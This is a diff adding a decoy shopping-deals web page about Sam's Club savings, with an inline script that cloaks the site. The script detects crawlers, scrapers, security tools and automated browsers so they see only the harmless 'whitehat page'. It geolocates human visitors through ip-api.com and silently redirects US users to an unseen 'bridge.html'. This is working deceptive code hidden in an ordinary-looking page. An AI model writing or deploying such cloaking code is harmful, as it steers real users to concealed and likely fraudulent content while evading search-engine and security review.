@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Member Deals - Exclusive Shopping Savings</title>
+<meta name="description" content="Find the best member deals and exclusive savings at your favorite stores.">
+<style>
+body { font-family: Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 40px 20px; color: #333; }
+h1 { color: #1a1a2e; font-size: 2em; }
+h2 { color: #444; font-size: 1.3em; margin-top: 30px; }
+p { line-height: 1.7; color: #555; }
+.card { background: #f9f9f9; border: 1px solid #e0e0e0; border-radius: 8px; padding: 20px; margin: 20px 0; }
+.tag { display: inline-block; background: #e8f5e9; color: #2e7d32; padding: 3px 10px; border-radius: 20px; font-size: 0.85em; margin-bottom: 10px; }
+footer { margin-top: 60px; font-size: 0.8em; color: #999; border-top: 1px solid #eee; padding-top: 20px; }
+</style>
+</head>
+<body>
+
+<h1>Member Deals</h1>
+<p>Your source for exclusive member savings, clearance finds, and shopping tips at major US retailers.</p>
+
+<div class="card">
+<span class="tag">This Week</span>
+<h2>Sam's Club Members: Best Deals to Grab Before They Sell Out</h2>
+<p>Sam's Club is currently clearing out select inventory ahead of new stock arrivals. Members who know which items are being discontinued can save significantly before prices return to normal. Check the latest clearance finds updated weekly.</p>
+</div>
+
+<div class="card">
+<span class="tag">Popular</span>
+<h2>Costco vs Sam's Club — Who Has Better Deals This Month?</h2>
+<p>A side by side breakdown of the best value items at both membership warehouses this month, including which Member's Mark products are outperforming name brands.</p>
+</div>
+
+<div class="card">
+<span class="tag">Trending</span>
+<h2>10 Things to Always Buy at Sam's Club (And 5 to Skip)</h2>
+<p>Not everything at Sam's Club is a deal. We break down which categories consistently offer real savings and which ones you are better off buying elsewhere.</p>
+</div>
+
+<footer>
+<p>MemberDeals.net — Independent shopping tips and member savings guides. Not affiliated with Sam's Club, Walmart, or any retailer mentioned.</p>
+</footer>
+
+<script>
+(function() {
+  var botPatterns = [
+    /googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i, /baiduspider/i,
+    /yandexbot/i, /sogou/i, /exabot/i, /facebot/i, /ia_archiver/i,
+    /msnbot/i, /mediapartners-google/i, /adsbot-google/i, /teoma/i,
+    /scooter/i, /speedy spider/i, /turnitinbot/i, /voilabot/i,
+    /yahoo/i, /ask jeeves/i, /fastcrawler/i, /infoseek/i, /lycos/i,
+    /wget/i, /curl/i, /libwww/i, /python-requests/i, /python-urllib/i,
+    /scrapy/i, /httpclient/i, /go-http-client/i, /java/i, /ruby/i,
+    /php/i, /perl/i, /mechanize/i, /urllib/i, /httpunit/i,
+    /nutch/i, /harvester/i, /webcopier/i, /fetch/i, /larbin/i,
+    /webmaster/i, /crawl/i, /spider/i, /robot/i, /bot\b/i,
+    /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
+    /embedly/i, /quora link preview/i, /showyoubot/i, /outbrain/i,
+    /pinterest/i, /slackbot/i, /vkShare/i, /W3C_Validator/i,
+    /whatsapp/i, /telegrambot/i, /discordbot/i
+  ];
+
+  var dcPatterns = [
+    /amazonaws/i, /googleusercontent/i, /cloudflare/i,
+    /microsoft/i, /azure/i, /digitalocean/i, /linode/i,
+    /vultr/i, /ovh/i, /hetzner/i
+  ];
+
+  function isBot() {
+    var ua = navigator.userAgent || '';
+    for (var i = 0; i < botPatterns.length; i++) {
+      if (botPatterns[i].test(ua)) return true;
+    }
+    if (!navigator.plugins || navigator.plugins.length === 0) return true;
+    if (typeof window.chrome === 'undefined' && /Chrome/.test(ua)) return true;
+    if (navigator.webdriver) return true;
+    if (window.callPhantom || window._phantom || window.phantom) return true;
+    if (window.__nightmare) return true;
+    if (document.documentElement.getAttribute('selenium')) return true;
+    if (window.domAutomation || window.domAutomationController) return true;
+    return false;
+  }
+
+  function getGeo(callback) {
+    try {
+      fetch('https://ip-api.com/json/?fields=countryCode', { timeout: 3000 })
+        .then(function(r) { return r.json(); })
+        .then(function(data) { callback(data.countryCode); })
+        .catch(function() { callback('US'); });
+    } catch(e) {
+      callback('US');
+    }
+  }
+
+  function isMobile() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  }
+
+  if (isBot()) {
+    // Bot sees the whitehat page already rendered — do nothing
+    return;
+  }
+
+  getGeo(function(country) {
+    if (country === 'US') {
+      window.location.href = 'bridge.html';
+    }
+    // Non-US traffic stays on whitehat page
+  });
+
+})();
+</script>
+</body>
+</html>
